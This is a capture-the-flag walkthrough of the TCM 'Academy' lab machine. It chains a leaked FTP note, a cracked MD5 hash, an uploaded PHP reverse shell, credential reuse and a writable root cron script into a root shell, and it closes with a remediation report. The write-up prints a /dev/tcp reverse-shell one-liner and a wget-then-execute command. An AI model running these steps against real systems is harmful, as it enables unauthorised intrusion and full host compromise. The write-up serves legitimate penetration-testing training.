# Academy - TCM Machine Walkthrough

<p align="center">
  <img src="https://img.shields.io/badge/Difficulty-Easy-green">
  <img src="https://img.shields.io/badge/OS-Linux-blue">
  <img src="https://img.shields.io/badge/Status-Rooted-success">
</p>

> **Platform:** TCM  
> **Machine:** Academy  
> **Difficulty:** Easy  
> **Objective:** Gain root access and capture the flag.

---

# Table of Contents

- [Overview](#overview)
- [Methodology](#methodology)
- [Reconnaissance](#reconnaissance)
- [Enumeration](#enumeration)
- [Initial Exploitation](#initial-exploitation)
- [Privilege Escalation](#privilege-escalation)
- [Flag Capture](#flag-capture)
- [Vulnerability Assessment](#vulnerability-assessment)
- [Key Takeaways & Lessons Learned](#key-takeaways--lessons-learned)
- [Pentester's Final Observation](#pentesters-final-observation)

---

# Overview

The Academy machine demonstrates how several seemingly minor security weaknesses can be chained together to achieve complete system compromise.

The attack path involved:

1. Information disclosure through FTP.
2. Weak password storage using MD5.
3. Unrestricted file upload resulting in Remote Code Execution.
4. Credential reuse.
5. Insecure cron execution leading to root compromise.

---

# Methodology

```text
Reconnaissance
      ↓
Enumeration
      ↓
Credential Discovery
      ↓
File Upload → RCE
      ↓
Local Enumeration
      ↓
Credential Reuse
      ↓
Cron Abuse
      ↓
Root Access
```

![](https://github.com/WNobsi/TCM-Academy-Machine-Walkthrough/blob/1a6b268b1586ab1eadd08032c62fc8ee3e3b5396/images/1methodology.png)

---

# Reconnaissance

## Host Discovery

```bash
netdiscover -r 192.168.126.0/24
```

or

```bash
nmap -sn 192.168.126.0/24
```

![](https://github.com/WNobsi/TCM-Academy-Machine-Walkthrough/blob/cbd3949f2c8efbba290734b2f0aa0a06fc72fc2c/images/reconnaissance_host_discovery.png)

## Port Discovery & Service Enumeration

```bash
nmap -sS -p- -A 192.168.126.131
```

### Findings

- Port 80 (HTTP)
- Academy web application

![](https://github.com/WNobsi/TCM-Academy-Machine-Walkthrough/blob/cbd3949f2c8efbba290734b2f0aa0a06fc72fc2c/images/reconnaissance_port_discovery_service_enum.png)

### Pentester's Observation

The first objective is to understand the exposed attack surface. A single web application can often provide enough opportunities to fully compromise a system.

---

# Enumeration

## Web Enumeration

```text
http://192.168.126.131
```
Shows the default Apache webpage, meaning there was no redirect to the index.html or landing page.
This can be flagged as Information Disclosure and be added to findings as it reveals the server information and version that is in use.

![](https://github.com/WNobsi/TCM-Academy-Machine-Walkthrough/blob/cbd3949f2c8efbba290734b2f0aa0a06fc72fc2c/images/web_default_page.png)

## Directory Enumeration

```bash
gobuster dir \
-u http://192.168.126.131 \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```
![](https://github.com/WNobsi/TCM-Academy-Machine-Walkthrough/blob/cbd3949f2c8efbba290734b2f0aa0a06fc72fc2c/images/scanning_directory_busting.png)

We find that,
```text
http://192.168.126.131/academy
```
Leads to a login page,

![](https://github.com/WNobsi/TCM-Academy-Machine-Walkthrough/blob/7e84291c31d291704ede38ff19f3f42ab9602659/images/login_invalid.png)

## FTP Information Disclosure

Interesting directories revealed an FTP resource, "note.txt".

We get access to the ftp using:
username: anonymous
password: anonymous

After retrieving the note.txt through ftp.
We make interesting discoveries.

![](https://github.com/WNobsi/TCM-Academy-Machine-Walkthrough/blob/cbd3949f2c8efbba290734b2f0aa0a06fc72fc2c/images/ftp_anonymous_login.png)
![](https://github.com/WNobsi/TCM-Academy-Machine-Walkthrough/blob/cbd3949f2c8efbba290734b2f0aa0a06fc72fc2c/images/ftp_note.txt.png)
![](https://github.com/WNobsi/TCM-Academy-Machine-Walkthrough/blob/7e84291c31d291704ede38ff19f3f42ab9602659/images/ftp_student_login_details.png)

Discovered credentials:

```text
Username: 10201321
Password: cd73502828457d15655bbd7a63fb0bc8
```

We try to login
The password resembles very similar to a hash, so we run it through a hash-identifier.

![](https://github.com/WNobsi/TCM-Academy-Machine-Walkthrough/blob/7e84291c31d291704ede38ff19f3f42ab9602659/images/hash_identification.png)

After identifying it is MD5, we use **Hashcat** to crack the hash and find that the value is:

![](https://github.com/WNobsi/TCM-Academy-Machine-Walkthrough/blob/7e84291c31d291704ede38ff19f3f42ab9602659/images/hash_cracked.png)

```text
student
```

Leading to the Final credentials:

```text
Username: 10201321
Password: student
```

### Pentester's Observation

Whenever credentials resemble hashes, always attempt identification and cracking before assuming they are plaintext.

---

# Initial Exploitation

## Student Portal Login

```text
Username: 10201321
Password: student
```

First we try with the hash as the password (maybe it might work!)
![](https://github.com/WNobsi/TCM-Academy-Machine-Walkthrough/blob/7e84291c31d291704ede38ff19f3f42ab9602659/images/login_invalid.png)

It gave us an error as invalid.

Next we try the cracked-hash 'student' as the password.

![](https://github.com/WNobsi/TCM-Academy-Machine-Walkthrough/blob/main/images/login_successful.png)

And it worked smoothly.

We see that the "My Profile" has a file upload functionality.
![](https://github.com/WNobsi/TCM-Academy-Machine-Walkthrough/blob/main/images/login_myprofile.png)

---

## File Upload Functionality

The profile page:

```text
/my_profile.php
```

suggests that the server is running PHP and allows image uploads.

### Pentester's Observation

File upload functionality is one of the highest-value attack vectors during web application testing because weak validation can quickly lead to Remote Code Execution.

---

## Uploading a PHP Reverse Shell

Use:

```text
https://github.com/pentestmonkey/php-reverse-shell
```

Modify:

```php
$ip = 'ATTACKER-IP';
$port = 1234;
```

Listener:

```bash
nc -lvnp 1234
```

![](https://github.com/WNobsi/TCM-Academy-Machine-Walkthrough/blob/7e84291c31d291704ede38ff19f3f42ab9602659/images/rever-shell_change.png)

Upload:

```text
photo.php
```

![](https://github.com/WNobsi/TCM-Academy-Machine-Walkthrough/blob/7e84291c31d291704ede38ff19f3f42ab9602659/images/rever-shell_upload.png)

![](https://github.com/WNobsi/TCM-Academy-Machine-Walkthrough/blob/7e84291c31d291704ede38ff19f3f42ab9602659/images/rever-shell_upload_successful.png)

And it uploaded successfully.

---

## Obtaining Remote Code Execution

```bash
hostname
whoami
```

Outputs:

```text
academy
www-data
```

![](https://github.com/WNobsi/TCM-Academy-Machine-Walkthrough/blob/7e84291c31d291704ede38ff19f3f42ab9602659/images/reverse-shell_reverse_connection_successful.png)

### Pentester's Observation

Initial access is only the beginning. The next objective is always privilege escalation.

---

# Privilege Escalation

From the reverse shell, we see that we cannot use

```bash
sudo su
```

to escalate to root user.

Which leads to our next step, escalating our privileges.

## Local Enumeration with LinPEAS

So we use a shell script called LinPEAS, which is available in /opt/linpeas/
We copy the linpeas.sh to /home/kali/Academy
And start our own http server using python3 in /home/kali/Academy directory.

```bash
python3 -m http.server 8000
```

![](https://github.com/WNobsi/TCM-Academy-Machine-Walkthrough/blob/7e84291c31d291704ede38ff19f3f42ab9602659/images/privesc_http_server_.png)

Now we download the linepeas.sh file into the victim machine using wget.
Change the permissions.
And execute the linpeas.sh

![](https://github.com/WNobsi/TCM-Academy-Machine-Walkthrough/blob/7e84291c31d291704ede38ff19f3f42ab9602659/images/privesc_wget_chmod.png)

```bash
wget http://192.168.126.128:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

And now we wait for the magic to happen,

![](https://github.com/WNobsi/TCM-Academy-Machine-Walkthrough/blob/7e84291c31d291704ede38ff19f3f42ab9602659/images/privesc_linpeas_legend.png)

![](https://github.com/WNobsi/TCM-Academy-Machine-Walkthrough/blob/7e84291c31d291704ede38ff19f3f42ab9602659/images/privesc_linpeas_grimmie.png)

![](https://github.com/WNobsi/TCM-Academy-Machine-Walkthrough/blob/7e84291c31d291704ede38ff19f3f42ab9602659/images/privesc_linpeas_mysql_password.png)

![](https://github.com/WNobsi/TCM-Academy-Machine-Walkthrough/blob/7e84291c31d291704ede38ff19f3f42ab9602659/images/privesc_linpeas_passwd.png)

We find a lot of interesting information that can help in escalating our privilege.

Lots of passwd files, mysql_passwords, users.
We open the /var/www/html/academy/includes/config.php file and check what information we can find in that specific file.

![](https://github.com/WNobsi/TCM-Academy-Machine-Walkthrough/blob/7e84291c31d291704ede38ff19f3f42ab9602659/images/privesc_linpeas_config_file.png)

We discovered:

```php
$mysql_user = "grimmie";
$mysql_password = "My_V3ryS3cur3_P4ss";
$mysql_database = "onlinecourse";
```


### Pentester's Observation

Configuration files often contain credentials and should always be inspected after gaining shell access.

---

## Credential Reuse

The information we found, can be very useful to escalate our privilege and now remotely access the server and try if the mysql password we found is reused,
and if it is, it works in our favour.

```bash
ssh grimmie@192.168.126.131
```

![](https://github.com/WNobsi/TCM-Academy-Machine-Walkthrough/blob/7e84291c31d291704ede38ff19f3f42ab9602659/images/ssh_grimmie_successful.png)

Fantastic! We got access to their server as an administrator only because the user kept the same credentials. That should teach them a lesson.

### Pentester's Observation

Credential reuse is one of the most common real-world weaknesses and frequently enables privilege escalation.

---

## Investigating Cron Jobs

We check for what files are there in the home directory using "ls" for grimmie and we find a very interesting piece of file.

A file named:
```text
backup.sh
```
was found in the user's home directory.

![](https://github.com/WNobsi/TCM-Academy-Machine-Walkthrough/blob/7e84291c31d291704ede38ff19f3f42ab9602659/images/ssh_grimmie_backup.png)

When we check the backup.sh file, it looks like a file running a script to backup the server -
by which we can infer that the file is scheduled to be executed by the system - meaning cron jobs are involved.

When we list grimmie's crontab, we see that nothing is listed. Which most probably can mean that the cron is run by another user, 
which maybe the root user.

To confirm, we use pspy to check if "backup.sh" is really scheduled or not.

PSPY : https://github.com/dominicbreuker/pspy

![](https://github.com/WNobsi/TCM-Academy-Machine-Walkthrough/blob/7e84291c31d291704ede38ff19f3f42ab9602659/images/pspy64%20github.png)

pspy is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea.

So we download pspy from github in our attacker machine and copy it into the http server folder we were running.
And we use wget to transfer the file to the victim machine.

![](https://github.com/WNobsi/TCM-Academy-Machine-Walkthrough/blob/7e84291c31d291704ede38ff19f3f42ab9602659/images/ssh_grimmie_pspy_wget.png)

![](https://github.com/WNobsi/TCM-Academy-Machine-Walkthrough/blob/7e84291c31d291704ede38ff19f3f42ab9602659/images/ssh_grimmie_pspy.png)

Using pspy confirmed that the script was executed by root.

### Pentester's Observation

Writable scripts executed by root are excellent privilege escalation opportunities.

---

## Cron Exploitation

Confirming that backup.sh is indeed being scheduled to run by cron and not by "grimmie" user.
Means it probably is scheduled by root and we can use this information to exploit and get root access.

So we change the script in backup.sh to run the following command and listen in port 8081 using netcat.
This is a reverse-shell script which connects to our attacker machine in port 8081.
```bash
bash -i >& /dev/tcp/192.168.126.128/8081 0>&1
```

![](https://github.com/WNobsi/TCM-Academy-Machine-Walkthrough/blob/7e84291c31d291704ede38ff19f3f42ab9602659/images/ssh_grimmie_backup_nano.png)

Start listener:

```bash
nc -nvlp 8081
```
![](https://github.com/WNobsi/TCM-Academy-Machine-Walkthrough/blob/7e84291c31d291704ede38ff19f3f42ab9602659/images/root_reverse_shell_FINAL_FLAG.png)

The machine connects back as root.

---

# Flag Capture

```bash
whoami
cat /root/flag.txt
```

Output:

```text
root
```

---

# Vulnerability Assessment

## 1. Information Disclosure via FTP

- **Severity:** High
- **CVSS v3.1:** 7.5

### Impact

Unauthorized access to application credentials.

### Remediation

- Remove sensitive files from public locations.
- Disable anonymous FTP.
- Restrict access using ACLs.

**Priority:** P2

---

## 2. Weak Password Storage (MD5)

- **Severity:** High
- **CVSS v3.1:** 7.5
- **CWE-327**
- **CWE-759**

### Remediation

- Use Argon2id, bcrypt, or scrypt.
- Implement salting.
- Enforce strong password policies.

**Priority:** P2

---

## 3. Unrestricted File Upload (RCE)

- **Severity:** Critical
- **CVSS v3.1:** 9.8
- **CWE-434**

### Remediation

- Validate file signatures and MIME types.
- Store uploads outside the web root.
- Disable script execution in upload directories.
- Implement allowlists.

**Priority:** P1

---

## 4. Credential Reuse

- **Severity:** High
- **CVSS v3.1:** 8.8
- **CWE-798**

### Remediation

- Separate application and system credentials.
- Rotate passwords.
- Use secrets management.

**Priority:** P1

---

## 5. Plaintext Credentials in Configuration Files

- **Severity:** Medium
- **CVSS v3.1:** 6.5
- **CWE-256**

### Remediation

- Store secrets in environment variables.
- Restrict file permissions.
- Use secret management solutions.

**Priority:** P3

---

## 6. Insecure Cron Permissions

- **Severity:** Critical
- **CVSS v3.1:** 9.8
- **CWE-732**

### Remediation

```bash
chown root:root backup.sh
chmod 700 backup.sh
```

- Audit cron jobs regularly.
- Monitor integrity of privileged scripts.

**Priority:** P1

---

## Vulnerability Prioritization Matrix

| Vulnerability | Severity | Priority |
|--------------|-----------|-----------|
| Unrestricted File Upload | Critical | P1 |
| Insecure Cron Permissions | Critical | P1 |
| Credential Reuse | High | P1 |
| Information Disclosure | High | P2 |
| Weak Password Storage | High | P2 |
| Plaintext Credentials | Medium | P3 |

---

# Key Takeaways & Lessons Learned

## Offensive Lessons

- Information disclosure can lead to complete compromise.
- File upload functionality should always be tested.
- Configuration files frequently expose credentials.
- Credential reuse remains highly dangerous.
- Process monitoring tools like pspy are invaluable.

## Defensive Lessons

- Enforce secure password storage.
- Validate file uploads.
- Separate credentials.
- Secure cron jobs.
- Implement least privilege.

---

# Pentester's Final Observation

The Academy machine perfectly demonstrates the concept of vulnerability chaining.

No single vulnerability directly resulted in root compromise. Instead, several weaknesses combined to create a complete attack path:

```text
Information Disclosure
        ↓
Weak Password Storage
        ↓
Remote Code Execution
        ↓
Credential Reuse
        ↓
Insecure Cron Permissions
        ↓
Root Compromise
```

> Security failures rarely occur because of a single vulnerability. They occur when several weaknesses coexist and amplify one another.

The key question throughout this engagement was:

**"What does this new piece of information allow me to do next?"**
